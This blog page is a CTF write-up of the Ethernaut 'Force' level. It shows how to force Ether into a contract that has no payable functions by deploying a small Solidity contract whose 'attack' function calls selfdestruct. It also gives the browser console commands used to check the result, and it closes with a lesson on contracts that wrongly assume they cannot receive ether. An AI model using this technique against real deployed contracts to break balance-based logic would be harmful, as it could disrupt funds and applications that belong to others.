<!doctype html><html lang=en><head><title>Force - Ethernaut :: Dimitris Vagiakakos SV1SJP</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="We have an empty smart-contract without any functions, constructor or even Fallback Function. Our goal is to send some Ether to it.
Ethereum smart-contracts typically they have 3 ways to receive ether from an another address.
// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Force {/* MEOW ? /\_/\ / ____/ o o \ /~____ =ø= / (______)__m_m) */} As we have already mentioned, by using a payable function. We don&amp;rsquo;t have any kind of function on this smart-contract so we cannot use this way."><meta name=keywords content="decentralized"><meta name=robots content="noodp"><link rel=canonical href=/blockchain_writeups/force/><link rel=stylesheet href=/styles.css><link rel="shortcut icon" href=/favicon.ico><meta name=twitter:card content="summary"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Force - Ethernaut"><meta property="og:description" content="We have an empty smart-contract without any functions, constructor or even Fallback Function. Our goal is to send some Ether to it.
Ethereum smart-contracts typically they have 3 ways to receive ether from an another address.
// SPDX-License-Identifier: MIT pragma solidity ^0.6.0; contract Force {/* MEOW ? /\_/\ / ____/ o o \ /~____ =ø= / (______)__m_m) */} As we have already mentioned, by using a payable function. We don&amp;rsquo;t have any kind of function on this smart-contract so we cannot use this way."><meta property="og:url" content="/blockchain_writeups/force/"><meta property="og:site_name" content="Dimitris Vagiakakos SV1SJP"><meta property="og:image" content="/favicon.ico"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:published_time" content="2022-01-02 00:00:00 +0000 UTC"></head><body class=lime><div class="container center"><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>Dimitris Vagiakakos SV1SJP</div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;▾</li><li><ul class=menu__dropdown><li><a href=/whoami>$whoami</a></li><li><a href=/about>About TuxHouse</a></li><li><a href=/blockchain_camera>Blockchain Camera</a></li><li><a href=/blockchain_writeups>Blockchain WriteUps</a></li><li><a href=/greek_articles>Greek Articles</a></li><li><a href=https://fosstodon.org/@sv1sjp>micro-blogging</a></li><li><a href=/panellinies_aepp/index.html>Panellinies_AEPP</a></li><li><a href=/projects>Projects</a></li><li><a href=/ubuntel>Ubuntel</a></li><li><a href=https://odysee.com/@TuxHouse:1>Videos</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/whoami>$whoami</a></li><li><a href=/about>About TuxHouse</a></li><li><a href=/blockchain_camera>Blockchain Camera</a></li><li><a href=/blockchain_writeups>Blockchain WriteUps</a></li><li><a href=/greek_articles>Greek Articles</a></li><li><a href=https://fosstodon.org/@sv1sjp>micro-blogging</a></li><li><a href=/panellinies_aepp/index.html>Panellinies_AEPP</a></li><li><a href=/projects>Projects</a></li><li><a href=/ubuntel>Ubuntel</a></li><li><a href=https://odysee.com/@TuxHouse:1>Videos</a></li></ul></nav></header><div class=content><article class=post><h1 class=post-title><a href=/blockchain_writeups/force/>Force - Ethernaut</a></h1><div class=post-meta><time class=post-date>2022-01-02</time><span class=post-author>Dimitris Vagiakakos</span><span class=post-reading-time>3 min read (472 words)</span></div><div class=post-content><div><p>We have an empty smart-contract without any functions, constructor or even Fallback Function. Our goal is to send some Ether to it.</p><p>Ethereum smart-contracts typically they have 3 ways to receive ether from an another address.</p><pre tabindex=0><code>// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/} 
</code></pre><ul><li>As we have already mentioned, by using a payable function. We don&rsquo;t have any kind of function on this smart-contract so we cannot use this way.</li><li>By receiving mining rewards. A smart-contract can be designed to be able to receive mining block rewards. Maybe it&rsquo;s not the best solution to our problem right now.</li><li>By destroying an other smart-contract using the selfdestruct() method in order to force send all of it&rsquo;s ether to an another address or smart contract. Maybe this method solves our problem.</li></ul><p>So, it&rsquo;s time to create a new smart-contract which has a public payable function on it with a selfdestruct() command.</p><pre tabindex=0><code>pragma solidity ^0.8.11;

contract SelfDestructingDapp{
    constructor() public payable{

    }

    function attack(address payable  _contractAddr) payable public {
        
        selfdestruct(_contractAddr);
    }
}
</code></pre><p>Now, we compile and deploy this smart-contract to Ethereum Blockchain with some amount of ether on it.
Time to call the attack function and give as a parameter the smart-contract&rsquo;s address.
As previously, we use the Console from our web browser to interact with the original smart contract and we type:</p><pre tabindex=0><code>await contract.address()
</code></pre><p>As we want to find smart-contract&rsquo;s address, we copy the address and then we give it as a parameter in the attack function on SelfDestructing Dapp.
We wait until the block to be mined and now we can check the balance of the original smart-contract by typing in console:</p><pre tabindex=0><code>await getBalance(contract.address)
</code></pre><p>And now we can see that it has the amount of ether that the SelfDestructing Dapp had.
Noticeably, when we use the selfdestruct() function and we send the amount of ether in an another address, if this address is not existing or we sent it to an smart-contract which hasn&rsquo;t any transfer() or withdraw() function, it is lost forever. It is of high importance to not burn ether like this, specially in the mainnet as we loose real world money and deflate the Ethereum Network. Additionally, we should never create a contract which uses as a fallback function with a requirement of some ether but code the contract to support transfer only from the owner. Someone can still use selfdestruct() in order to send an amount of ether to the contract and trigger the fallback function without being the owner.</p><hr><p>If you want to learn more about Smart Contract Security, please check our paper and eCourses:</p><h2 id=smart-contract-security>Smart-Contract Security:<a href=#smart-contract-security class=hanchor arialabel=Anchor>&#8983;</a></h2><ul><li><p><a href="https://www.youtube.com/playlist?list=PLZa7COjIxKWzLcMxI9cRNSzOtdR0xvXB7">Smart Contract Security - Educational eLearning Series in Greek on YouTube - Click Here</a></p></li><li><p><a href="https://odysee.com/@TuxHouse:1/Ethereum-Hacking-Series-%28Greek%29:b?r=D1QgYeP81GoKPkW5T1jP96zxGA4GMfho&amp;lid=b0b540e62d96ed2811b776519fc460617e4c40747">Smart Contract Security - Educational eLearning Series in Greek on LBRY - Click Here</a></p></li></ul></div></div></article></div><footer class=footer><a rel=me href=https://fosstodon.org/@sv1sjp></a><div class=footer__inner><div class="copyright copyright--user"><span>All rights reserved, TuxHouse Educational Technologies - Dimitris LinuxOS - 2011-2023</span></div></div></footer><script type=text/javascript src=/bundle.min.js></script></div></body></html>